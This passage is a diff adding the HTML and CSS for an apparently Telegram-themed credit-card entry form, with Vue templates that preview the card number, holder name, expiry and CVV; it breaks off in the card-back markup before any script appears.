@@ -1,0 +1,1639 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>PLNX Card Form</title>
+  <style>
+    @import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
+    @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
+    @import url("https://fonts.googleapis.com/css?family=Montserrat&amp;display=swap");
+    body {
+      font-family: "Source Sans Pro", sans-serif;
+      font-size: 16px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin:0;
+      padding:0;
+    }
+    *:focus {
+      outline: none;
+    }
+
+    .wrapper {
+      min-height: 100vh;
+      background: var(--tg-theme-bg-color);
+      display: flex;
+      padding: 15px 15px;
+    }
+    @media screen and (max-width: 700px), (max-height: 500px) {
+      .wrapper {
+        flex-wrap: wrap;
+        flex-direction: column;
+      }
+    }
+
+    .card-form {
+      max-width: 570px;
+      margin: auto;
+      width: 100%;
+    }
+    @media screen and (max-width: 576px) {
+      .card-form {
+        margin: 0 auto;
+      }
+    }
+    .card-form__inner {
+      background: #fff;
+      box-shadow: 0 30px 60px 0 rgba(90, 116, 148, 0.4);
+      border-radius: 10px;
+      padding: 35px;
+      padding-top: 180px;
+      padding-bottom: 70px;
+    }
+    @media screen and (max-width: 480px) {
+      .card-form__inner {
+        padding: 25px;
+        padding-top: 165px;
+        padding-bottom: 65px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-form__inner {
+        padding: 15px;
+        padding-top: 165px;
+      }
+    }
+    .card-form__row {
+      display: flex;
+      align-items: flex-start;
+    }
+    @media screen and (max-width: 480px) {
+      .card-form__row {
+        flex-wrap: wrap;
+      }
+    }
+    .card-form__col {
+      flex: auto;
+      margin-right: 35px;
+    }
+    .card-form__col:last-child {
+      margin-right: 0;
+    }
+    @media screen and (max-width: 480px) {
+      .card-form__col {
+        margin-right: 0;
+        flex: unset;
+        width: 100%;
+        margin-bottom: 20px;
+      }
+      .card-form__col:last-child {
+        margin-bottom: 0;
+      }
+    }
+    .card-form__col.-cvv {
+      max-width: 150px;
+    }
+    @media screen and (max-width: 480px) {
+      .card-form__col.-cvv {
+        max-width: initial;
+      }
+    }
+    .card-form__group {
+      display: flex;
+      align-items: flex-start;
+      flex-wrap: wrap;
+    }
+    .card-form__group .card-input__input {
+      flex: 1;
+      margin-right: 15px;
+    }
+    .card-form__group .card-input__input:last-child {
+      margin-right: 0;
+    }
+    .card-form__button {
+      width: 100%;
+      height: 55px;
+      background: var(--tg-theme-button-color);
+      border: none;
+      border-radius: 5px;
+      font-size: 22px;
+      font-weight: 500;
+      font-family: "Source Sans Pro", sans-serif;
+      box-shadow: 3px 10px 20px 0px rgba(35, 100, 210, 0.3);
+      color: var(--tg-theme-button-text-color);
+      margin-top: 20px;
+      cursor: pointer;
+    }
+    @media screen and (max-width: 480px) {
+      .card-form__button {
+        margin-top: 10px;
+      }
+    }
+
+    /***********************************************************************************************************/
+    /***********************************************************************************************************/
+    .btn {
+      background-color: transparent;
+      border-radius: 1em;
+      margin-top: 45px;
+      display: inline-block;
+      position: relative;
+      border: none;
+      box-sizing: border-box;
+      transition: width 0.3s ease-in-out;
+      cursor: pointer;
+      width: 100%;
+    }
+    .pre-btn-disabled{
+      cursor: not-allowed;
+    }
+    .btn-disabled {
+      pointer-events: none;
+    }
+    .btn__text-disabled {
+      cursor: not-allowed;
+      background-color: var(--tg-theme-hint-color) !important;
+    }
+    
+    .btn:not(:disabled):active {
+        transform: translateY(0.1em);
+    }
+    
+    .btn__text {
+        background-color: var(--tg-theme-button-color);
+        position: absolute; 
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        border-radius: inherit;
+        font-size: 20px;
+        font-weight: 500;
+        font-family: "Source Sans Pro", sans-serif;
+        box-shadow: 3px 10px 20px 0px rgba(35, 100, 210, 0.3);
+        color: var(--tg-theme-button-text-color);
+        padding: 0.75em 1.5em;
+        transition:
+            background-color 0.15s linear,
+            color 0.15s 0.3s ease-in-out;
+        width: 100%;
+        height: 55px;
+    }
+    
+    .btn:not(:disabled):focus .btn__text,
+    .btn:not(:disabled):hover .btn__text {
+        background-color: var(--tg-theme-secondary-bg-color);
+    }
+    
+    .btn__progress {
+      overflow: visible;
+      position: absolute; 
+      top: 50%; 
+      left: 50%;
+      transform: translate(-50%, -50%); 
+      width: 3em;
+      height: 3em;
+      visibility: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .btn__progress-track {
+        stroke: var(--tg-theme-secondary-bg-color);
+        stroke-width: 24;
+    }
+    
+    .btn__progress-fill {
+        stroke: var(--tg-theme-button-color);
+        stroke-dashoffset: 125.66;
+    }
+    
+    .btn__progress-check {
+        stroke: hsl(0, 0%, 100%);
+        stroke-dashoffset: 34;
+    }
+    
+    /* Both states */
+    .btn--running,
+    .btn--done {
+        outline: none;
+        pointer-events: none;
+        width: 100%;
+        user-select: none;
+        -moz-user-select: none;
+        -webkit-user-select: none;
+    }
+    
+    .btn--running .btn__text,
+    .btn--done .btn__text {
+        color: transparent;
+        transition:
+            background-color 0.3s ease-in-out,
+            visibility 0.3s steps(1);
+    }
+    
+    .btn--running .btn__progress,
+    .btn--done .btn__progress {
+        visibility: visible;
+    }
+    
+    /* Running state */
+    .btn--running .btn__text {
+        background-color: var(--tg-theme-button-color);
+        visibility: hidden;
+    }
+    
+    .btn--running .btn__progress {
+        transition: visibility 0.3s 0.3s steps(1, start);
+    }
+    
+    .btn--running .btn__progress-track {
+        stroke-width: 8;
+        transition:
+            r 0.3s 0.3s ease-in-out,
+            stroke-width 0.3s 0.3s ease-in-out;
+    }
+    
+    .btn--running .btn__progress-fill {
+        stroke-dashoffset: 0;
+        transition: stroke-dashoffset 2s 0.6s linear;
+    }
+    
+    /* Done state */
+    .btn--done .btn__progress-track {
+        stroke: var(--tg-theme-button-color);
+        transition:
+            r 0.3s ease-in-out,
+            stroke-width 0.3s ease-in-out;
+    }
+    
+    .btn--done .btn__progress-check {
+        stroke-dashoffset: 0;
+        transition: stroke-dashoffset 0.3s 0.3s ease-out;
+    }
+
+    /***********************************************************************************************************/
+    /***********************************************************************************************************/
+    .card-item {
+      max-width: 430px;
+      height: 270px;
+      margin-left: auto;
+      margin-right: auto;
+      position: relative;
+      z-index: 2;
+      width: 100%;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item {
+        max-width: 350px;
+        height: 220px;
+        width: 90%;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item {
+        height: 180px;
+      }
+    }
+    .card-item.-active .card-item__side.-front {
+      transform: perspective(1000px) rotateY(180deg) rotateX(0deg) rotateZ(0deg);
+    }
+    .card-item.-active .card-item__side.-back {
+      transform: perspective(1000px) rotateY(0) rotateX(0deg) rotateZ(0deg);
+    }
+    .card-item__focus {
+      position: absolute;
+      z-index: 3;
+      border-radius: 5px;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      transition: all 0.35s cubic-bezier(0.71, 0.03, 0.56, 0.85);
+      opacity: 0;
+      pointer-events: none;
+      overflow: hidden;
+      border: 2px solid rgba(255, 255, 255, 0.65);
+    }
+    .card-item__focus:after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #08142f;
+      height: 100%;
+      border-radius: 5px;
+      filter: blur(25px);
+      opacity: 0.5;
+    }
+    .card-item__focus.-active {
+      opacity: 1;
+    }
+    .card-item__side {
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px 0 rgba(14, 42, 90, 0.55);
+      transform: perspective(2000px) rotateY(0deg) rotateX(0deg) rotate(0deg);
+      transform-style: preserve-3d;
+      transition: all 0.8s cubic-bezier(0.71, 0.03, 0.56, 0.85);
+      backface-visibility: hidden;
+      height: 100%;
+    }
+    .card-item__side.-back {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      transform: perspective(2000px) rotateY(-180deg) rotateX(0deg) rotate(0deg);
+      z-index: 2;
+      padding: 0;
+      height: 100%;
+    }
+    .card-item__side.-back .card-item__cover {
+      transform: rotateY(-180deg);
+    }
+    .card-item__bg {
+      max-width: 100%;
+      display: block;
+      max-height: 100%;
+      height: 100%;
+      width: 100%;
+      object-fit: cover;
+    }
+    .card-item__cover {
+      height: 100%;
+      background-color: #1c1d27;
+      position: absolute;
+      height: 100%;
+      background-color: #1c1d27;
+      left: 0;
+      top: 0;
+      width: 100%;
+      border-radius: 15px;
+      overflow: hidden;
+    }
+    .card-item__cover:after {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(6, 2, 29, 0.45);
+    }
+    .card-item__top {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      margin-bottom: 40px;
+      padding: 0 10px;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__top {
+        margin-bottom: 25px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__top {
+        margin-bottom: 15px;
+      }
+    }
+    .card-item__chip {
+      width: 60px;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__chip {
+        width: 50px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__chip {
+        width: 40px;
+      }
+    }
+    .card-item__type {
+      height: 45px;
+      position: relative;
+      display: flex;
+      justify-content: flex-end;
+      max-width: 100px;
+      margin-left: auto;
+      width: 100%;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__type {
+        height: 40px;
+        max-width: 90px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__type {
+        height: 30px;
+      }
+    }
+    .card-item__typeImg {
+      max-width: 100%;
+      object-fit: contain;
+      max-height: 100%;
+      object-position: top right;
+    }
+    .card-item__info {
+      color: #fff;
+      width: 100%;
+      max-width: calc(100% - 85px);
+      padding: 10px 15px;
+      font-weight: 500;
+      display: block;
+      cursor: pointer;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__info {
+        padding: 10px;
+      }
+    }
+    .card-item__holder {
+      opacity: 0.7;
+      font-size: 13px;
+      margin-bottom: 6px;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__holder {
+        font-size: 12px;
+        margin-bottom: 5px;
+      }
+    }
+    .card-item__wrapper {
+      font-family: "Source Code Pro", monospace;
+      padding: 25px 15px;
+      position: relative;
+      z-index: 4;
+      height: 100%;
+      text-shadow: 7px 6px 10px rgba(14, 42, 90, 0.8);
+      user-select: none;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__wrapper {
+        padding: 20px 10px;
+      }
+    }
+    .card-item__name {
+      font-size: 18px;
+      line-height: 1;
+      white-space: nowrap;
+      max-width: 100%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      text-transform: uppercase;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__name {
+        font-size: 16px;
+      }
+    }
+    .card-item__nameItem {
+      display: inline-block;
+      min-width: 8px;
+      position: relative;
+    }
+    .card-item__number {
+      font-weight: 500;
+      line-height: 1;
+      color: #fff;
+      font-size: 27px;
+      margin-bottom: 35px;
+      display: inline-block;
+      padding: 10px 15px;
+      cursor: pointer;
+    }
+    .error-border {
+      border-color: red !important;
+    }
+    .valid-border {
+      border-color: green !important;
+    }
+    
+    @media screen and (max-width: 480px) {
+      .card-item__number {
+        font-size: 21px;
+        margin-bottom: 15px;
+        padding: 10px 10px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__number {
+        font-size: 19px;
+        margin-bottom: 10px;
+        padding: 10px 10px;
+      }
+    }
+    .card-item__numberItem {
+      width: 16px;
+      display: inline-block;
+    }
+    .card-item__numberItem.-active {
+      width: 30px;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__numberItem {
+        width: 13px;
+      }
+      .card-item__numberItem.-active {
+        width: 16px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__numberItem {
+        width: 12px;
+      }
+      .card-item__numberItem.-active {
+        width: 8px;
+      }
+    }
+    .card-item__content {
+      color: #fff;
+      display: flex;
+      align-items: flex-start;
+    }
+    .card-item__date {
+      flex-wrap: wrap;
+      font-size: 18px;
+      margin-left: auto;
+      padding: 10px;
+      display: inline-flex;
+      width: 80px;
+      white-space: nowrap;
+      flex-shrink: 0;
+      cursor: pointer;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__date {
+        font-size: 16px;
+      }
+    }
+    .card-item__dateItem {
+      position: relative;
+    }
+    .card-item__dateItem span {
+      width: 22px;
+      display: inline-block;
+    }
+    .card-item__dateTitle {
+      opacity: 0.7;
+      font-size: 13px;
+      padding-bottom: 6px;
+      width: 100%;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__dateTitle {
+        font-size: 12px;
+        padding-bottom: 5px;
+      }
+    }
+    .card-item__band {
+      background: rgba(0, 0, 19, 0.8);
+      width: 100%;
+      height: 50px;
+      margin-top: 30px;
+      position: relative;
+      z-index: 2;
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__band {
+        margin-top: 20px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__band {
+        height: 40px;
+        margin-top: 10px;
+      }
+    }
+    .card-item__cvv {
+      text-align: right;
+      position: relative;
+      z-index: 2;
+      padding: 15px;
+    }
+    .card-item__cvv .card-item__type {
+      opacity: 0.7;
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__cvv {
+        padding: 10px 15px;
+      }
+    }
+    .card-item__cvvTitle {
+      padding-right: 10px;
+      font-size: 15px;
+      font-weight: 500;
+      color: #fff;
+      margin-bottom: 5px;
+    }
+    .card-item__cvvBand {
+      height: 45px;
+      background: #fff;
+      margin-bottom: 30px;
+      text-align: right;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      padding-right: 10px;
+      color: #1a3b5d;
+      font-size: 18px;
+      border-radius: 4px;
+      box-shadow: 0px 10px 20px -7px rgba(32, 56, 117, 0.35);
+    }
+    @media screen and (max-width: 480px) {
+      .card-item__cvvBand {
+        height: 40px;
+        margin-bottom: 20px;
+      }
+    }
+    @media screen and (max-width: 360px) {
+      .card-item__cvvBand {
+        margin-bottom: 15px;
+      }
+    }
+
+    .card-list {
+      margin-bottom: -130px;
+    }
+    @media screen and (max-width: 480px) {
+      .card-list {
+        margin-bottom: -120px;
+      }
+    }
+
+    .card-input {
+      margin-bottom: 20px;
+    }
+    .card-input__label {
+      font-size: 14px;
+      margin-bottom: 5px;
+      font-weight: 500;
+      color: #1a3b5d;
+      width: 100%;
+      display: block;
+      user-select: none;
+    }
+    .card-input__input {
+      width: 100%;
+      height: 50px;
+      border-radius: 5px;
+      box-shadow: none;
+      border: 1px solid #ced6e0;
+      transition: all 0.3s ease-in-out;
+      font-size: 18px;
+      padding: 5px 15px;
+      background: none;
+      color: #1a3b5d;
+      font-family: "Source Sans Pro", sans-serif;
+    }
+    .card-input__input:hover, .card-input__input:focus {
+      border-color: #3d9cff;
+    }
+    .card-input__input:focus {
+      box-shadow: 0px 10px 20px -13px rgba(32, 56, 117, 0.35);
+    }
+    .card-input__input.-select {
+      appearance: none;
+      -webkit-appearance: none;
+      background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAeCAYAAABuUU38AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAUxJREFUeNrM1sEJwkAQBdCsngXPHsQO9O5FS7AAMVYgdqAd2IGCDWgFnryLFQiCZ8EGnJUNimiyM/tnk4HNEAg/8y6ZmMRVqz9eUJvRaSbvutCZ347bXVJy/ZnvTmdJ862Me+hAbZCTs6GHpyUi1tTSvPnqTpoWZPUa7W7ncT3vK4h4zVejy8QzM3WhVUO8ykI6jOxoGA4ig3BLHcNFSCGqGAkig2yqgpEiMsjSfY9LxYQg7L6r0X6wS29YJiYQYecemY+wHrXD1+bklGhpAhBDeu/JfIVGxaAQ9sb8CI+CQSJ+QmJg0Ii/EE2MBiIXooHRQhRCkBhNhBcEhLkwf05ZCG8ICCOpk0MULmvDSY2M8UawIRExLIQIEgHDRoghihgRIgiigBEjgiFATBACAgFgghEwSAAGgoBCBBgYAg5hYKAIFYgHBo6w9RRgAFfy160QuV8NAAAAAElFTkSuQmCC");
+      background-size: 12px;
+      background-position: 90% center;
+      background-repeat: no-repeat;
+      padding-right: 30px;
+    }
+
+    .slide-fade-up-enter-active {
+      transition: all 0.25s ease-in-out;
+      transition-delay: 0.1s;
+      position: relative;
+    }
+
+    .slide-fade-up-leave-active {
+      transition: all 0.25s ease-in-out;
+      position: absolute;
+    }
+
+    .slide-fade-up-enter {
+      opacity: 0;
+      transform: translateY(15px);
+      pointer-events: none;
+    }
+
+    .slide-fade-up-leave-to {
+      opacity: 0;
+      transform: translateY(-15px);
+      pointer-events: none;
+    }
+
+    .slide-fade-right-enter-active {
+      transition: all 0.25s ease-in-out;
+      transition-delay: 0.1s;
+      position: relative;
+    }
+
+    .slide-fade-right-leave-active {
+      transition: all 0.25s ease-in-out;
+      position: absolute;
+    }
+
+    .slide-fade-right-enter {
+      opacity: 0;
+      transform: translateX(10px) rotate(45deg);
+      pointer-events: none;
+    }
+
+    .slide-fade-right-leave-to {
+      opacity: 0;
+      transform: translateX(-10px) rotate(45deg);
+      pointer-events: none;
+    }
+
+    .github-btn {
+      position: absolute;
+      right: 40px;
+      bottom: 50px;
+      text-decoration: none;
+      padding: 15px 25px;
+      border-radius: 4px;
+      box-shadow: 0px 4px 30px -6px rgba(36, 52, 70, 0.65);
+      background: #24292e;
+      color: #fff;
+      font-weight: bold;
+      letter-spacing: 1px;
+      font-size: 16px;
+      text-align: center;
+      transition: all 0.3s ease-in-out;
+    }
+    @media screen and (min-width: 500px) {
+      .github-btn:hover {
+        transform: scale(1.1);
+        box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
+      }
+    }
+    @media screen and (max-width: 700px) {
+      .github-btn {
+        position: relative;
+        bottom: auto;
+        right: auto;
+        margin-top: 20px;
+      }
+      .github-btn:active {
+        transform: scale(1.1);
+        box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
+      }
+    }
+
+    /***********************************************************************************************************/
+    /***********************************************************************************************************/
+    .loader {
+      font: 400 16px 'Varela Round', sans-serif;
+      padding-top: 50px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      display: none;
+    }
+    #wifi-loader {
+      --background: #62ABFF;
+      --front-color: var(--tg-theme-button-color); 
+      --back-color: var(--tg-theme-hint-color);
+      --text-color: var(--tg-theme-hint-color); 
+      width: 64px;
+      height: 64px;
+      border-radius: 50px;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      svg {
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        circle {
+          position: absolute;
+          fill: none;
+          stroke-width: 6px;
+          stroke-linecap: round;
+          stroke-linejoin: round;
+          transform: rotate(-100deg);
+          transform-origin: center;
+          &.back {
+            stroke: var(--back-color);
+          }
+          &.front {
+            stroke: var(--front-color);
+          }
+        }
+        &.circle-outer {
+          height: 86px;
+          width: 86px;
+          circle {
+            stroke-dasharray: 62.75 188.25;
+            &.back {
+              animation: circle-outer 1.8s ease infinite .3s;
+            }
+            &.front {
+              animation: circle-outer 1.8s ease infinite .15s;
+            }
+          }
+        }
+        &.circle-middle {
+          height: 60px;
+          width: 60px;
+          circle {
+            stroke-dasharray: 42.5 127.5;
+            &.back {
+              animation: circle-middle 1.8s ease infinite .25s;
+            }
+            &.front {
+              animation: circle-middle 1.8s ease infinite .1s;
+            }
+          }
+        }
+        &.circle-inner {
+          height: 34px;
+          width: 34px;
+          circle {
+            stroke-dasharray: 22 66;
+            &.back {
+              animation: circle-inner 1.8s ease infinite .2s;
+            }
+            &.front {
+              animation: circle-inner 1.8s ease infinite .05s;
+            }
+          }
+        }
+      }
+      .text {
+        position: absolute; 
+        bottom: -40px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        text-transform: lowercase;
+        font-weight: 500;
+        font-size: 14px;
+        letter-spacing: .2px;
+        &::before,
+        &::after {
+          content: attr(data-text);
+        }
+        &::before {
+          color: var(--text-color);
+        }
+        &::after {
+          color: var(--front-color);
+          animation: text-animation 3.6s ease infinite;
+          position: absolute;
+          left: 0;
+        }
+      }
+    }
+    
+    @keyframes circle-outer {
+      0% {
+        stroke-dashoffset: 25;
+      }
+      25% {
+        stroke-dashoffset: 0;
+      }
+      65% {
+        stroke-dashoffset: 301;
+      }
+      80% {
+        stroke-dashoffset: 276;
+      }
+      100% {
+        stroke-dashoffset: 276;
+      }
+    }
+    
+    @keyframes circle-middle {
+      0% {
+        stroke-dashoffset: 17;
+      }
+      25% {
+        stroke-dashoffset: 0;
+      }
+      65% {
+        stroke-dashoffset: 204;
+      }
+      80% {
+        stroke-dashoffset: 187;
+      }
+      100% {
+        stroke-dashoffset: 187;
+      }
+    }
+    
+    @keyframes circle-inner {
+      0% {
+        stroke-dashoffset: 9;
+      }
+      25% {
+        stroke-dashoffset: 0;
+      }
+      65% {
+        stroke-dashoffset: 106;
+      }
+      80% {
+        stroke-dashoffset: 97;
+      }
+      100% {
+        stroke-dashoffset: 97;
+      }
+    }
+    
+    @keyframes text-animation {
+      0% {
+        clip-path: inset(0 100% 0 0);
+      }
+      50% {
+        clip-path: inset(0);
+      }
+      100% {
+        clip-path: inset(0 0 0 100%);
+      }
+    }
+
+    /***********************************************************************************************************/
+    /***********************************************************************************************************/
+    .container-error {
+      box-sizing: border-box;
+      justify-content: center;
+      width: 100vw;
+      height: 100vh;
+      display: none;
+    }
+    .box {
+      margin: 40px 0;
+      border-radius: 10px;
+      max-width: 450px;
+      padding: 0px;
+      width: 75px;
+      height: 75px;
+      background: #1d273b;
+      animation: anime 3s cubic-bezier(0.16, 1, 0.3, 1) 1s forwards;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.45), 0 4px 8px rgba(0, 0, 0, 0.35), 0 8px 12px rgba(0, 0, 0, 0.15);
+      font-family: "Montserrat";
+    }
+
+    @keyframes anime {
+      0% {
+        width: 75px;
+        height: 75px;
+        background: #1d273b;;
+      }
+      50% {
+        width: 95vw;
+        height: 75px;
+        background: #1d273b;;
+        padding: 0px;
+      }
+      100% {
+        width: 95vw;
+        height: 650px;
+        background: #1d273b;;
+        padding-top: 30px;
+        padding-bottom: 10px;
+        padding-left: 25px;
+        padding-right: 25px;
+      }
+    }
+
+    .checkmark__circle {
+      stroke-dasharray: 166;
+      stroke-dashoffset: 166;
+      stroke-width: 2;
+      stroke-miterlimit: 10;
+      stroke: #f4645f;
+      fill: none;
+      animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+
+      &.red {
+        stroke: #f4645f;
+      }
+    }
+
+    .checkmark {
+      display: none;
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      display: block;
+      stroke-width: 2;
+      stroke: #fff;
+      stroke-miterlimit: 10;
+      margin: 0.5em auto;
+      box-shadow: inset 0px 0px 0px #f4645f;
+      animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+
+      &.red {
+        box-shadow: inset 0px 0px 0px #f4645f;
+        animation: fill-red .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+      }
+
+    }
+    .checkmark_txt{
+      display: none;
+      position: relative;
+      width: 100%;
+      color: #fff;
+      font-size: 50px;
+      font-weight: 700;
+      font-family: "Montserrat";
+    }
+
+    .checkmark__check {
+      transform-origin: 50% 50%;
+      stroke-dasharray: 48;
+      stroke-dashoffset: 48;
+      animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+    }
+
+    @keyframes stroke {
+      100% {
+        stroke-dashoffset: 0;
+      }
+    }
+    @keyframes scale {
+      0%, 100% {
+        transform: none;
+      }
+      50% {
+        transform: scale3d(1.1, 1.1, 1);
+      }
+    }
+    @keyframes fill-red {
+      100% {
+        box-shadow: inset 0px 0px 0px 30px #f4645f;
+      }
+    }
+    .message-box {
+      text-align: center;
+    }
+
+      .btn.generate {
+        user-select: none;
+        position: relative;
+        width: 100%;
+        height: 50px;
+        margin: 20px 0;
+        border-radius: 8px;
+        color: #fff;
+        border: none;
+        background-image: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        letter-spacing: 1px;
+        font-weight: bold;
+        text-transform: uppercase;
+        cursor: pointer;
+        transition: all 150ms ease;
+        display: none;
+    }
+    .btn.generate:active {
+        transform: translateY(-3%);
+        box-shadow: 0 4px 8px rgba(255, 255, 255, 0.08);
+    }
+
+    .field-title {
+      position: absolute;
+      top: -10px;
+      left: 8px;
+      transform: translateY(-50%);
+      font-weight: 800;
+      color: rgba(255, 255, 255, 0.5);
+      text-transform: uppercase;
+      font-size: 0.65rem;
+      pointer-events: none;
+      user-select: none;
+  }
+  ul {
+    padding-left: 20px; 
+    list-style-type: disc;
+  }
+  .settings {
+    position: relative;
+    margin-top: 35px;
+    height: auto;
+    display: flex;
+    flex-direction: column;
+    display: none;
+  }
+  .settings .setting {
+    position: relative;
+    height: 360px;
+    background: rgba(255, 255, 255, 0.08);
+    border-radius: 8px;
+    display: flex;
+    padding: 15px 10px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 500;
+    font-family: "Montserrat";
+    margin-bottom: 8px;
+  }
+
+  @media screen and (max-width: 480px) {
+    .settings .setting {
+      font-size: 15px;
+    }
+    .checkmark_txt{
+      font-size: 45px;
+    }
+  }
+  @media screen and (max-width: 420px) {
+    .settings .setting {
+      font-size: 13px;
+    }
+    .checkmark_txt{
+      font-size: 40px;
+    }
+  }
+
+  </style>
+</head>
+<body>
+<!-- html -->
+  <div class="wrapper" id="app">
+    <div class="card-form">
+      <div class="card-list">
+        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
+          <div class="card-item__side -front">
+            <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
+            <div class="card-item__cover">
+              <img
+              v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
+            </div>
+            
+            <div class="card-item__wrapper">
+              <div class="card-item__top">
+                <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" class="card-item__chip">
+                <div class="card-item__type">
+                  <transition name="slide-fade-up">
+                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
+                  </transition>
+                </div>
+              </div>
+              <label for="cardNumber" class="card-item__number" ref="cardNumber">
+                <template v-if="getCardType === 'amex'">
+                 <span v-for="(n, $index) in amexCardMask" :key="$index">
+                  <transition name="slide-fade-up">
+                    <div
+                      class="card-item__numberItem"
+                      v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''"
+                    >*</div>
+                    <div class="card-item__numberItem"
+                      :class="{ '-active' : n.trim() === '' }"
+                      :key="$index" v-else-if="cardNumber.length > $index">
+                      {{cardNumber[$index]}}
+                    </div>
+                    <div
+                      class="card-item__numberItem"
+                      :class="{ '-active' : n.trim() === '' }"
+                      v-else
+                      :key="$index + 1"
+                    >{{n}}</div>
+                  </transition>
+                </span>
+                </template>
+
+                <template v-else>
+                  <span v-for="(n, $index) in otherCardMask" :key="$index">
+                    <transition name="slide-fade-up">
+                      <div
+                        class="card-item__numberItem"
+                        v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''"
+                      >*</div>
+                      <div class="card-item__numberItem"
+                        :class="{ '-active' : n.trim() === '' }"
+                        :key="$index" v-else-if="cardNumber.length > $index">
+                        {{cardNumber[$index]}}
+                      </div>
+                      <div
+                        class="card-item__numberItem"
+                        :class="{ '-active' : n.trim() === '' }"
+                        v-else
+                        :key="$index + 1"
+                      >{{n}}</div>
+                    </transition>
+                  </span>
+                </template>
+              </label>
+              <div class="card-item__content">
+                <label for="cardName" class="card-item__info" ref="cardName">
+                  <div class="card-item__holder">Card Holder</div>
+                  <transition name="slide-fade-up">
+                    <div class="card-item__name" v-if="cardName.length" key="1">
+                      <transition-group name="slide-fade-right">
+                        <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span>
+                      </transition-group>
+                    </div>
+                    <div class="card-item__name" v-else key="2">Full Name</div>
+                  </transition>
+                </label>
+                <div class="card-item__date" ref="cardDate">
+                  <label for="cardMonth" class="card-item__dateTitle">Expires</label>
+                  <label for="cardMonth" class="card-item__dateItem">
+                    <transition name="slide-fade-up">
+                      <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span>
+                      <span v-else key="2">MM</span>
+                    </transition>
+                  </label>
+                  /
+                  <label for="cardYear" class="card-item__dateItem">
+                    <transition name="slide-fade-up">
+                      <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
+                      <span v-else key="2">YY</span>
+                    </transition>
+                  </label>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="card-item__side -back">
+            <div class="card-item__cover">
+              <img
+              v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + currentCardBackground + '.jpeg'" class="card-item__bg">
+            </div>
+            <div class="card-item__band"></div>
+            <div class="card-item__cvv">
+                <div class="card-item__cvvTitle">CVV</div>
+                <div class="card-item__cvvBand">
+                  <span v-for="(n, $index) in cardCvv" :key="$index">
+                    *
+                  </span>
+
+              </div>
+                <div class="card-item__type">
